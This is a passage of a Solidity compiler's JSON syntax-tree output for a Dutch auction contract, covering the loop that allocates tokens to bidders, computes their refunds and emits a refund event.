ref"}},"id":1613,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"8147:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"8132:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"arguments":[{"id":1616,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"8166:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1615,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8158:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1614,"name":"uint256","nodeType":"ElementaryTypeName","src":"8158:7:7","typeDescriptions":{}}},"id":1617,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8158:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8132:47:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8116:63:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1669,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1657,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1655,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8680:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1656,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8695:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8680:16:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1668,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1658,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8716:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1667,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1659,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8731:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1661,"indexExpression":{"id":1660,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8743:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8731:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1662,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"8746:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"8731:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"arguments":[{"id":1665,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"8765:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1664,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8757:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1663,"name":"uint256","nodeType":"ElementaryTypeName","src":"8757:7:7","typeDescriptions":{}}},"id":1666,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8757:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8731:47:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8716:62:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"8680:98:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1704,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1702,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"9209:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"hexValue":"30","id":1703,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9225:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9209:17:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1723,"nodeType":"IfStatement","src":"9205:200:7","trueBody":{"id":1722,"nodeType":"Block","src":"9228:177:7","statements":[{"expression":{"id":1710,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1705,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9284:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1707,"indexExpression":{"id":1706,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9296:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9284:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1708,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"9299:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"9284:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1709,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9321:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"9284:38:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1711,"nodeType":"ExpressionStatement","src":"9284:38:7"},{"expression":{"id":1720,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1712,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9340:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1714,"indexExpression":{"id":1713,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9352:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9340:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1715,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"9355:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"9340:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"expression":{"baseExpression":{"id":1716,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9367:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1718,"indexExpression":{"id":1717,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9379:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9367:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1719,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"9382:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"9367:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9340:50:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1721,"nodeType":"ExpressionStatement","src":"9340:50:7"}]}},"id":1724,"nodeType":"IfStatement","src":"8659:746:7","trueBody":{"id":1701,"nodeType":"Block","src":"8793:305:7","statements":[{"expression":{"id":1675,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1670,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8811:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1672,"indexExpression":{"id":1671,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8823:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8811:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1673,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"8826:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"8811:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":1674,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8848:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8811:49:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1676,"nodeType":"ExpressionStatement","src":"8811:49:7"},{"expression":{"id":1679,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1677,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8878:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1678,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8893:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8878:16:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1680,"nodeType":"ExpressionStatement","src":"8878:16:7"},{"expression":{"id":1699,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1681,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8912:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1683,"indexExpression":{"id":1682,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8924:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8912:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1684,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"8927:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"8912:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1698,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1685,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8959:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1687,"indexExpression":{"id":1686,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8971:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8959:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1688,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"8974:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"8959:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1697,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1689,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9005:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1691,"indexExpression":{"id":1690,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9017:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9005:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1692,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"9020:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"9005:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":1695,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"9070:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1694,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"9062:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1693,"name":"uint256","nodeType":"ElementaryTypeName","src":"9062:7:7","typeDescriptions":{}}},"id":1696,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9062:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9005:78:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8959:124:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8912:171:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1700,"nodeType":"ExpressionStatement","src":"8912:171:7"}]}},"id":1725,"nodeType":"IfStatement","src":"8095:1310:7","trueBody":{"id":1654,"nodeType":"Block","src":"8194:284:7","statements":[{"expression":{"id":1633,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1620,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8212:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1622,"indexExpression":{"id":1621,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8224:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8212:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1623,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"8227:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"8212:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1632,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1624,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8269:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1626,"indexExpression":{"id":1625,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8281:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8269:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1627,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"8284:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"8269:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"arguments":[{"id":1630,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"8323:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1629,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8315:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1628,"name":"uint256","nodeType":"ElementaryTypeName","src":"8315:7:7","typeDescriptions":{}}},"id":1631,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8315:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8269:67:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8212:124:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1634,"nodeType":"ExpressionStatement","src":"8212:124:7"},{"expression":{"id":1645,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":1635,"name":"currentAlgos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1596,"src":"8354:12:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1644,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"baseExpression":{"id":1636,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8370:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1638,"indexExpression":{"id":1637,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8382:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8370:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1639,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"8385:8:7","memberName":"bidValue","nodeType":"MemberAccess","referencedDeclaration":1047,"src":"8370:23:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"/","rightExpression":{"arguments":[{"id":1642,"name":"currentPrice","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1008,"src":"8404:12:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"id":1641,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8396:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint256_$","typeString":"type(uint256)"},"typeName":{"id":1640,"name":"uint256","nodeType":"ElementaryTypeName","src":"8396:7:7","typeDescriptions":{}}},"id":1643,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8396:21:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8370:47:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8354:63:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1646,"nodeType":"ExpressionStatement","src":"8354:63:7"},{"expression":{"id":1652,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"expression":{"baseExpression":{"id":1647,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"8435:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1649,"indexExpression":{"id":1648,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"8447:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"8435:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1650,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"memberLocation":"8450:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"8435:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":1651,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8462:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8435:28:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1653,"nodeType":"ExpressionStatement","src":"8435:28:7"}]}},{"eventCall":{"arguments":[{"expression":{"baseExpression":{"id":1727,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9452:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1729,"indexExpression":{"id":1728,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9464:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9452:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1730,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"9467:13:7","memberName":"walletAddress","nodeType":"MemberAccess","referencedDeclaration":1045,"src":"9452:28:7","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"expression":{"baseExpression":{"id":1731,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9498:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1733,"indexExpression":{"id":1732,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9510:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9498:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1734,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"9513:19:7","memberName":"totalAlgosPurchased","nodeType":"MemberAccess","referencedDeclaration":1049,"src":"9498:34:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"expression":{"baseExpression":{"id":1735,"name":"biddersList","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1041,"src":"9550:11:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder storage ref)"}},"id":1737,"indexExpression":{"id":1736,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1600,"src":"9562:1:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"9550:14:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage","typeString":"struct Dutch_Auction.Bidder storage ref"}},"id":1738,"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"memberLocation":"9565:9:7","memberName":"refundEth","nodeType":"MemberAccess","referencedDeclaration":1051,"src":"9550:24:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1726,"name":"RefundEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1195,"src":"9423:11:7","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function 